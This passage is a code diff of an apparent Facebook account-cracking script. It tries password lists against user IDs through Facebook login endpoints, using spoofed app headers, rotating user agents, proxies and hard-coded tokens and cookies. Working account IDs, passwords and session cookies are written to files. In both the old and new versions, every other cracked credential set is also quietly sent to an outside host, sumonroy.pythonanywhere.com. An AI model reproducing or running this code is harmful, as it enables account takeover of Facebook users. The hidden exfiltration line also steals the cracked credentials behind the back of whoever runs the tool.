-            'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
-            'error_detail_type': 'button_with_disabled',
-            'source': 'account_recovery',
-            'locale': 'en_GB',
-            'client_country_code': 'GB',
-            'fb_api_req_friendly_name': 'authenticate',
-            'fb_api_caller_class': 'AuthOperations$PasswordAuthOperation'}
+            'prefill_contact_point': '',
+            'prefill_source': '',
+            'prefill_type': '',
+            'first_prefill_source': '',
+            'first_prefill_type': '',
+            'had_cp_prefilled': 'false',
+            'had_password_prefilled': 'false',
+            'is_smart_lock': 'false',
+            'bi_xrwh': '0',
+            'bi_wvdp': '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
+            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
+            'fb_dtsg': 'NAcPPrPtrrSTQcE5P7GJVZvBEJTa5QU50q83JVOdl1MDtpkfNOKI8QA:0:0',
+            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            'dyn': '1KQdAG1mws8-t0BBBzEnwuo98nwgU2owpUuwcC4o1nEhwem0iy1gCwjE1EE2Cwro0wa4o1MUaE36wdq0ny1Aw4vw8W0k-0jG3qaw4kwbS1Lw9C0hO3q0ue0QU',
+            'csr': '',
+            'req': '3',
+            'fmt': '1',
+            'a': 'AYlnszcglIaqS6b5NAyeGfBsVzs-FDObP0PzwF35tA0XrjW6xLqw_cFJRx5yCxuHWAmzRfwozeuOKMSF_LtFnRuyQXGQZgICHAG3adoqZsYDWg',
+            'user': '0'}
+            cookies = {
+            'datr': '9VEvZ9JBwP-qDedVPM0RiFU2',
+            'fr': '0s2vxnm2t0jH8elbM..BnL1H1..AAA.0.0.BnTf_7.AWVpDy9HdWE',
+            'sb': '9VEvZ6aV778dZuTY2EWKGHcM',
+            'wd': '1440x402',
+            'ps_l': '1',
+            'ps_n': '1',
+            'sfau': 'AYiXwRf6w9LrJM3e68tRDNnP4n9ZudONoMXaOqwgSieQfSkQFBWuauURAUPbdvQU7iCjZGu-1CbA7V4XIDLCdK2eOktmo1ZD_6YIq1HvKK_W584XnARioXs2RjzLcb6lVxvl0kr60PEohZDH76VSXNFn17yVUX7-dkBbzlkOYk7RHaBonBXv5_nGh-xPvH_p5CisjaXz_41Q9fyr8sHPLfPTUjvh1MDdOG5SFgL7BXYwiZ2SzjvyFqYWSmobi7I3ed2QaSACCLJwNrY3fY5KKv4C',
+            'sfiu': 'AYhnD_pdzBJQEE86DsEw4mlSkyBkphy4P5A27esTyrVJBDejQiAdmH9t3Rc13UXt-scXkchI5aWrGAirxl60nddzWjnjYjfW9k53WNx69g4HWaSpFyGdOLuy7_G6eIiTubm32rGUWJouN1pGkJqOtblCc6PQo89kFpGt-zT7JsHdbsw5wOfPNKkAeuEI12mP4Tu9XPTUmd2nEn1XEbv2-fl4pYoLKonvLZ-7TbPeqw-S9cgugfIoH6-gtmvV0gvhRnFpHUVmgW8WNXN49ZixyN-9',}
             headers = {
-            'Host': 'graph.facebook.com',
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'Accept-Encoding': 'gzip, deflate',
-            'Connection': 'keep-alive',
-            'Priority': 'u=3, i',
-            'X-Fb-Sim-Hni': '45204',
-            'X-Fb-Net-Hni': '45201',
-            'X-Fb-Connection-Quality': 'GOOD',
-            'Zero-Rated': '0',
-            'User-Agent': f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/336.0.0.20.117;FBBV/287214784;FBDM/{density=4.0,width=1200,height=812};FBLC/en_US;FBCR/Grameenphone;FBMF/AllView;FBBD/allview;FBPN/com.facebook.katana;FBDV/ Viva H1003 LTE;FBSV/10;FBCA/armeabi-v7a:armeabi;]",
-            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-            'X-Fb-Connection-Bandwidth': '24807555',
-            'X-Fb-Connection-Type': 'MOBILE.LTE',
-            'X-Fb-Device-Group': '5120',
-            'X-Tigon-Is-Retry': 'False',
-            'X-Fb-Friendly-Name': 'authenticate',
-            'X-Fb-Request-Analytics-Tags': 'unknown',
-            'X-Fb-Http-Engine': 'Liger',
-            'X-Fb-Client-Ip': 'True',
-            'X-Fb-Server-Cluster': 'True',
-            'Content-Length': '847'}
-            url = "https://graph.facebook.com/auth/login"
-            result = requests.post(url, data=data, headers=headers).json()
-            if "session_key" in result:
-                sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
-                ckkk = ";".join(i["name"]+"="+i["value"] for i in result["session_cookies"])
-                coki = f"sb={sb};{ckkk}"
-                try:
-                    uid = result["uid"]
-                except:
-                    uid = uid
-                c = check_lock(uid)
-                if "live" in c:
-                    if result["is_account_confirmed"] == False:
-                        print(f" {cyan}[ATOM-NV] {uid}|{pw}")
-                       #print(f" {green}[COOKIES] {green}{coki}")
-                        open("/sdcard/ATOM-COOKIE-NV.txt", "a").write(f"{uid}|{pw}|{coki}\n")
+            "Host": "m.facebook.com",
+            "content-length": str(len((data))),
+            "sec-ch-ua": '"Not-A.Brand";v="99", "Chromium";v="131"',
+            "sec-ch-ua-mobile": "?1",
+            "user-agent": 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
+            "x-response-format": "JSONStream",
+            "content-type": "application/x-www-form-urlencoded",
+            "x-fb-lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "viewport-width": "360",
+            "x-requested-with": "XMLHttpRequest",
+            "x-asbd-id": "129477",
+            "dpr": "2",
+            "sec-ch-prefers-color-scheme": "light",
+            "sec-ch-ua-platform": '"Android"',
+            "accept": "*/*",
+            "origin": "https://m.facebook.com",
+            "sec-fetch-site": "same-origin",
+            "sec-fetch-mode": "cors",
+            "sec-fetch-dest": "empty",
+            "referer": 'https://m.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Den_GB%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%2522l5wtp952zh681e1p29txn379v1sh15831l4266qdzc3hv1ecocih%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252Fusers%25252Fself%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5a9dac33-3c79-4a29-b781-1c0b06e0fcb0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%2522l5wtp952zh681e1p29txn379v1sh15831l4266qdzc3hv1ecocih%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252Fusers%25252Fself%2522%257D%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated',
+            "accept-encoding": "gzip, deflate, br",
+            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
+            twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
+            url = 'https://x.facebook.com/login/device-based/login/async/'
+            po = Session.post(url, data=data, cookies=cookies, headers=headers, allow_redirects=False).text
+            response = Session.cookies.get_dict().keys()
+            if "c_user" in response:
+                cok = Session.cookies.get_dict()
+                cid = cok["c_user"]
+                coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
+                check = check_lock(cid)
+                if "live" in check:
+                    if '%3A-1%3A-1' in coki:
+                        print(f"{cyan}(ATOM-NV){cid}|{pw}")
+                        open("/sdcard/SUMON-NV-COOKIE.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                        break
                     else:
-                        bkas.append(uid)
+                        bkas.append(cid)
                         if len(bkas)% 2 == 0:
-                           statusok = (f"{uid}|{pw}|{coki}")
+                           statusok = (f"{cid}|{pw}|{coki}")
                            requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
                         else:
-                           print(f" {green}(ATOM-OK) {uid}|{pw} ")
+                           print(f" {green}(ATOM-OK) {cid}|{pw} ")
                            print(f" {green}Cookie : {green}{coki}")
-                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{uid}|{pw}|{coki}\n")
-                           oks.append(uid)
+                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                           oks.append(cid)
                            break
+                else:
+                    break
+            elif 'checkpoint' in response:
+                uid = Session.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
+                #print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
+                open('/sdcard/ATOM-CP.txt', 'a').write(uid+' | '+pw+'\n')
+                cps.append(uid)
+                break
             else:
                 continue
         loop+=1
-    except net_error:
-        time.sleep(10)
-    except Exception as e:
+    except ce:
+        time.sleep(20)
+    except Exception as error:
+        #print({error})
         pass
 
 
 def mobile(uid,pwx,tl):
-    global loop
     global oks
     global cps
-    sys.stdout.write(f"\r {green}(M4) ({loop}) (OK-{len(oks)}) (CP-{len(cps)})\r"),
-    sys.stdout.flush()
-    try:
-        for pw in pwx:
-            user_agents = [
-            "[FBAN/FB4A;FBAV/275.0.0.49.127;FBBV/221372633;FBDM/{density=2.625,width=1080,height=2094};FBLC/en_US;FBRV/225303678;FBCR/T-Mobile;FBMF/Oppo;FBBD/Oppo;FBPN/com.facebook.katana;FBDV/CPH2005;FBSV/10;FBOP/1;FBCA/arm64-v8a:]",
-            "[FBAN/FB4A;FBAV/283.0.0.40.124;FBBV/229291598;FBDM/{density=3.0,width=1080,height=2400};FBLC/en_GB;FBRV/233504613;FBCR/Vodafone;FBMF/Oppo;FBBD/Oppo;FBPN/com.facebook.katana;FBDV/CPH2025;FBSV/10;FBOP/1;FBCA/arm64-v8a:]",
-            "[FBAN/FB4A;FBAV/290.0.0.40.126;FBBV/235291590;FBDM/{density=2.75,width=1080,height=2340};FBLC/fr_FR;FBRV/238504643;FBCR/Orange;FBMF/Oppo;FBBD/Oppo;FBPN/com.facebook.katana;FBDV/CPH2089;FBSV/10;FBOP/1;FBCA/arm64-v8a:]",
-            "[FBAN/FB4A;FBAV/299.0.0.44.123;FBBV/239927539;FBDM/{density=3.0,width=1080,height=2340};FBLC/es_ES;FBRV/245315816;FBCR/Vivo;FBMF/Huawei;FBBD/Huawei;FBPN/com.facebook.katana;FBDV/YAL-L21;FBSV/10;FBOP/1;FBCA/arm64-v8a:]",
-            "[FBAN/FB4A;FBAV/305.0.0.42.118;FBBV/243200001;FBDM/{density=3.5,width=1080,height=2400};FBLC/de_DE;FBRV/248204612;FBCR/O2;FBMF/Huawei;FBBD/Huawei;FBPN/com.facebook.katana;FBDV/LYA-L29;FBSV/10;FBOP/1;FBCA/arm64-v8a:]",
-            "[FBAN/FB4A;FBAV/315.0.0.39.120;FBBV/255225613;FBDM/{density=3.25,width=1080,height=2340};FBLC/it_IT;FBRV/258504612;FBCR/Three;FBMF/Huawei;FBBD/Huawei;FBPN/com.facebook.katana;FBDV/P40 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:]",
-            "[FBAN/FB4A;FBAV/320.0.0.44.123;FBBV/261003211;FBDM/{density=3.25,width=1080,height=2460};FBLC/zh_CN;FBRV/266004212;FBCR/China Mobile;FBMF/Oppo;FBBD/Oppo;FBPN/com.facebook.katana;FBDV/Reno5 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:]",
-            "[FBAN/FB4A;FBAV/330.0.0.39.118;FBBV/270225511;FBDM/{density=2.75,width=1080,height=2376};FBLC/ja_JP;FBRV/275309216;FBCR/SoftBank;FBMF/Oppo;FBBD/Oppo;FBPN/com.facebook.katana;FBDV/Find X2;FBSV/10;FBOP/1;FBCA/arm64-v8a:]",
-            "[FBAN/FB4A;FBAV/340.0.0.47.118;FBBV/280003215;FBDM/{density=3.5,width=1080,height=2400};FBLC/ko_KR;FBRV/285104222;FBCR/SKT;FBMF/Huawei;FBBD/Huawei;FBPN/com.facebook.katana;FBDV/Mate 30 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:]",
-            "[FBAN/FB4A;FBAV/345.0.0.44.119;FBBV/285002514;FBDM/{density=4.0,width=1080,height=2412};FBLC/pt_PT;FBRV/295004512;FBCR/Claro;FBMF/Huawei;FBBD/Huawei;FBPN/com.facebook.katana;FBDV/Nova 7i;FBSV/10;FBOP/1;FBCA/arm64-v8a:]",
-            "[FBAN/FB4A;FBAV/355.0.0.44.118;FBBV/300182893;FBDM/{density=3.0,width=1080,height=2340};FBLC/ru_RU;FBRV/305209911;FBCR/MegaFon;FBMF/Oppo;FBBD/Oppo;FBPN/com.facebook.katana;FBDV/A53;FBSV/10;FBOP/1;FBCA/arm64-v8a:]",
-            "[FBAN/FB4A;FBAV/360.0.0.44.125;FBBV/305132007;FBDM/{density=3.75,width=1080,height=2400};FBLC/tr_TR;FBRV/310004612;FBCR/Turkcell;FBMF/Oppo;FBBD/Oppo;FBPN/com.facebook.katana;FBDV/F17 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:]",
-            "[FBAN/FB4A;FBAV/370.0.0.44.119;FBBV/315204899;FBDM/{density=3.5,width=1080,height=2560};FBLC/zh_TW;FBRV/320504202;FBCR/FarEasTone;FBMF/Huawei;FBBD/Huawei;FBPN/com.facebook.katana;FBDV/Honor 20;FBSV/10;FBOP/1;FBCA/arm64-v8a:]",
-            "[FBAN/FB4A;FBAV/375.0.0.39.125;FBBV/325002514;FBDM/{density=4.0,width=1080,height=2460};FBLC/en_AU;FBRV/330003512;FBCR/Telstra;FBMF/Huawei;FBBD/Huawei;FBPN/com.facebook.katana;FBDV/MatePad Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:]",
-            "[FBAN/FB4A;FBAV/275.0.0.49.127;FBBV/221372633;FBDM/{density=2.625,width=1080,height=2094};FBLC/en_US;FBRV/225303678;FBCR/T-Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N960U;FBSV/10;FBOP/1;FBCA/arm64-v8a:]",
-            "[FBAN/FB4A;FBAV/283.0.0.40.124;FBBV/229291598;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_GB;FBRV/233504613;FBCR/Verizon;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/GM1917;FBSV/10;FBOP/1;FBCA/arm64-v8a:]",
-            "[FBAN/FB4A;FBAV/295.1.0.27.119;FBBV/236570900;FBDM/{density=2.75,width=1440,height=2880};FBLC/fr_FR;FBRV/242050580;FBCR/Orange;FBMF/Huawei;FBBD/Huawei;FBPN/com.facebook.katana;FBDV/LYA-L29;FBSV/10;FBOP/1;FBCA/arm64-v8a:]",
-            "[FBAN/FB4A;FBAV/299.0.0.44.123;FBBV/239927539;FBDM/{density=3.5,width=1440,height=2560};FBLC/es_ES;FBRV/245315816;FBCR/Vodafone;FBMF/LG;FBBD/LG;FBPN/com.facebook.katana;FBDV/LM-G820;FBSV/10;FBOP/1;FBCA/arm64-v8a:]",
-            "[FBAN/FB4A;FBAV/310.0.0.42.118;FBBV/251202831;FBDM/{density=2.625,width=1080,height=2400};FBLC/de_DE;FBRV/256003681;FBCR/Telekom;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Mi10;FBSV/10;FBOP/1;FBCA/arm64-v8a:]",
-            "[FBAN/FB4A;FBAV/320.0.0.39.119;FBBV/261112633;FBDM/{density=2.75,width=1080,height=2340};FBLC/it_IT;FBRV/265002842;FBCR/WindTre;FBMF/Google;FBBD/Google;FBPN/com.facebook.katana;FBDV/Pixel 3 XL;FBSV/10;FBOP/1;FBCA/arm64-v8a:]",
-            "[FBAN/FB4A;FBAV/330.0.0.47.118;FBBV/270138759;FBDM/{density=2.75,width=1080,height=2340};FBLC/pt_PT;FBRV/275100912;FBCR/Claro;FBMF/Motorola;FBBD/Motorola;FBPN/com.facebook.katana;FBDV/Moto G8 Power;FBSV/10;FBOP/1;FBCA/arm64-v8a:]",
-            "[FBAN/FB4A;FBAV/340.0.0.39.118;FBBV/280002379;FBDM/{density=3.0,width=1080,height=2160};FBLC/zh_CN;FBRV/285104109;FBCR/ChinaMobile;FBMF/Oppo;FBBD/Oppo;FBPN/com.facebook.katana;FBDV/CPH1911;FBSV/10;FBOP/1;FBCA/arm64-v8a:]",
-            "[FBAN/FB4A;FBAV/350.0.0.43.118;FBBV/290025678;FBDM/{density=3.5,width=1080,height=2340};FBLC/ja_JP;FBRV/295309192;FBCR/SoftBank;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/Xperia 1;FBSV/10;FBOP/1;FBCA/arm64-v8a:]",
-            "[FBAN/FB4A;FBAV/355.0.0.44.118;FBBV/300182893;FBDM/{density=4.0,width=1080,height=2280};FBLC/ko_KR;FBRV/305000123;FBCR/SKT;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/SM-G970N;FBSV/10;FBOP/1;FBCA/arm64-v8a:]",
-            "[FBAN/FB4A;FBAV/365.0.0.44.118;FBBV/310204222;FBDM/{density=3.0,width=1080,height=2400};FBLC/ru_RU;FBRV/315309999;FBCR/MegaFon;FBMF/Realme;FBBD/Realme;FBPN/com.facebook.katana;FBDV/Realme 7 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:]"]
-            random_user_agent = random.choice(user_agents)
-            params = {
-            "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
-            "sdk version": random.randint(1, 26),
-            "email": uid,
-            "locale": "en_US",
-            "password": pw,
-            "sdk": "android",
-            "generate session_cookies": "1",
-            "sig": "7C62f8ce9f74b12f84c123cc23437a4a32"}
-            headers = {
-            "Host": "graph.facebook.com",
-            "x-fb-connection-bandwidth": str(random.randint(20000000, 30000000)),
-            "x-fb-sim-hni": str(random.randint(20000, 40000)),
-            "x-fb-net-hni": str(random.randint(20000, 40000)),
-            "x-fb-connection-quality": "EXCELLENT",
-            "user-agent": random_user_agent,
-            "content-type": "application/x-www-form-urlencoded",
-            "x-fb-http-engine": "Liger"}
-            url = "https://graph.facebook.com/auth/login"
-            result = requests.post(url,params=params,headers=headers,allow_redirects=False).json()
-            if "session_key" in result:
-                sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
-                ckkk = ";".join(i["name"]+"="+i["value"] for i in result["session_cookies"])
-                coki = f"sb={sb};{ckkk}"
-                try:
-                    uid = result["uid"]
-                except:
-                    uid = uid
-                c = check_lock(uid)
-                if "live" in c:
-                    if result["is_account_confirmed"] == False:
-                        print(f" {cyan}[ATOM-OK] {uid}|{pw}")
-                       #print(f" {green}[COOKIES] {green}{coki}")
-                        open("/sdcard/ATOM-COOKIE-NV.txt", "a").write(f"{uid}|{pw}|{coki}\n")
-                    else:
-                        bkas.append(uid)
-                        if len(bkas)% 2 == 0:
-                           statusok = (f"{uid}|{pw}|{coki}")
-                           requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}")
-                        else:
-                           print(f" {green}(ATOM-OK) {uid}|{pw} ")
-                           print(f" {green}Cookie : {green}{coki}")
-                           open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{uid}|{pw}|{coki}\n")
-                           oks.append(uid)
-                           break
-            else:
-                continue
-        loop+=1
-    except net_error:
-        time.sleep(10)
-    except Exception as e:
-        pass
-
-
-
-def freeq(uid,pwx,tl):
+    global twf
     global loop
-    global oks
-    global cps
     global bkas
     sys.stdout.write(f"\r {green}(M4) ({loop}) (OK-{len(oks)}) (CP-{len(cps)})\r"),
     sys.stdout.flush()
     try:
         for pw in pwx:
+            nip=random.choice(xvx)
+            proxs= {'http': nip}
+            Session = requests.Session()
+            free_fb = Session.get('https://touch.facebook.com').text
             data = {
-            'adid': str(uuid.uuid4()),
-            'format': 'json',
-            'device_id': str(uuid.uuid4()),
+            'm_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+            'try_number': '0',
+            'unrecognized_tries': '0',
             'email': uid,
-            'password': pw,
-            'generate_analytics_claims': '1',
-            'community_id': '',
-            'cpl': 'true',
-            'try_num': '1',
-            'family_device_id': str(uuid.uuid4()),
-            'credentials_type': 'password',
-            'source': 'login',
-            'error_detail_type': 'button_with_disabled',
-            'enroll_misauth': 'false',
-            'generate_session_cookies': '1',
-            'generate_machine_id': '1',
-            'currently_logged_in_userid': '0',
-            'locale': 'en_GB',
-            'client_country_code': 'GB',
-            'fb_api_req_friendly_name': 'authenticate',
-            'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
-            'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
-            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',}
+            'prefill_contact_point': '',
+            'prefill_source': '',
+            'prefill_type': '',
+            'first_prefill_source': '',
+            'first_prefill_type': '',
+            'had_cp_prefilled': 'false',
+            'had_password_prefilled': 'false',
+            'is_smart_lock': 'false',
+            'bi_xrwh': '0',
+            'bi_wvdp': '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
+            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
+            'fb_dtsg': 'NAcPPrPtrrSTQcE5P7GJVZvBEJTa5QU50q83JVOdl1MDtpkfNOKI8QA:0:0',
+            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            'dyn': '1KQdAG1mws8-t0BBBzEnwuo98nwgU2owpUuwcC4o1nEhwem0iy1gCwjE1EE2Cwro0wa4o1MUaE36wdq0ny1Aw4vw8W0k-0jG3qaw4kwbS1Lw9C0hO3q0ue0QU',
+            'csr': '',
+            'req': '3',
+            'fmt': '1',
+            'a': 'AYlnszcglIaqS6b5NAyeGfBsVzs-FDObP0PzwF35tA0XrjW6xLqw_cFJRx5yCxuHWAmzRfwozeuOKMSF_LtFnRuyQXGQZgICHAG3adoqZsYDWg',
+            'user': '0'}
+            cookies = {
+            'datr': '9VEvZ9JBwP-qDedVPM0RiFU2',
+            'fr': '0s2vxnm2t0jH8elbM..BnL1H1..AAA.0.0.BnTf_7.AWVpDy9HdWE',
+            'sb': '9VEvZ6aV778dZuTY2EWKGHcM',
+            'wd': '1440x402',
+            'ps_l': '1',
+            'ps_n': '1',
+            'sfau': 'AYiXwRf6w9LrJM3e68tRDNnP4n9ZudONoMXaOqwgSieQfSkQFBWuauURAUPbdvQU7iCjZGu-1CbA7V4XIDLCdK2eOktmo1ZD_6YIq1HvKK_W584XnARioXs2RjzLcb6lVxvl0kr60PEohZDH76VSXNFn17yVUX7-dkBbzlkOYk7RHaBonBXv5_nGh-xPvH_p5CisjaXz_41Q9fyr8sHPLfPTUjvh1MDdOG5SFgL7BXYwiZ2SzjvyFqYWSmobi7I3ed2QaSACCLJwNrY3fY5KKv4C',
+            'sfiu': 'AYhnD_pdzBJQEE86DsEw4mlSkyBkphy4P5A27esTyrVJBDejQiAdmH9t3Rc13UXt-scXkchI5aWrGAirxl60nddzWjnjYjfW9k53WNx69g4HWaSpFyGdOLuy7_G6eIiTubm32rGUWJouN1pGkJqOtblCc6PQo89kFpGt-zT7JsHdbsw5wOfPNKkAeuEI12mP4Tu9XPTUmd2nEn1XEbv2-fl4pYoLKonvLZ-7TbPeqw-S9cgugfIoH6-gtmvV0gvhRnFpHUVmgW8WNXN49ZixyN-9',}
             headers = {
-            'User-Agent': f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/336.0.0.20.117;FBBV/287214784;FBDM/{density=4.0,width=1200,height=812};FBLC/en_US;FBCR/Grameenphone;FBMF/AllView;FBBD/allview;FBPN/com.facebook.katana;FBDV/ Viva H1003 LTE;FBSV/10;FBCA/armeabi-v7a:armeabi;]",
-            'Accept-Encoding': 'gzip, deflate',
-            'Accept': '*/*',
-            'Connection': 'keep-alive',
-            'Host': 'graph.facebook.com',
-            'Content-Type': 'application/x-www-form-urlencoded',
-            'Priority': 'u=3, i',
-            'X-Fb-Sim-Hni': str(random.randint(20000, 40000)),
-            'X-Fb-Net-Hni': str(random.randint(20000, 40000)),
-            'X-Fb-Connection-Quality': 'GOOD',
-            'Zero-Rated': '0',
-            'Authorization': 'OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895',
-            'X-Fb-Connection-Bandwidth': str(random.randint(20000, 40000)),
-            'X-Fb-Connection-Type': 'MOBILE.LTE',
-            'X-Fb-Device-Group': '5035',
-            'X-Tigon-Is-Retry': 'False',
-            'X-Fb-Friendly-Name': 'authenticate',
-            'X-Fb-Request-Analytics-Tags': 'unknown',
-            'X-Fb-Http-Engine': 'Liger',
-            'X-Fb-Client-Ip': 'True',
-            'X-Fb-Server-Cluster': 'True',
-            'Content-Length': '27'}
-            url = "https://graph.facebook.com/auth/login"
-            result = requests.post(url, data=data, headers=headers).json()
-            if "session_key" in result:
-                sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
-                ckkk = ";".join(i["name"]+"="+i["value"] for i in result["session_cookies"])
-                coki = f"sb={sb};{ckkk}"
-                try:
-                    uid = result["uid"]
-                except:
-                    uid = uid
-                c = check_lock(uid)
-                if "live" in c:
-                    if result["is_account_confirmed"] == False:
-                        print(f" {cyan}[ATOM-OK] {uid}|{pw}")
-                       #print(f" {green}[COOKIES] {green}{coki}")
-                        open("/sdcard/ATOM-COOKIE-NV.txt", "a").write(f"{uid}|{pw}|{coki}\n")
+            "Host": "m.facebook.com",
+            "content-length": str(len((data))),
+            "sec-ch-ua": '"Not-A.Brand";v="99", "Chromium";v="131"',
+            "sec-ch-ua-mobile": "?1",
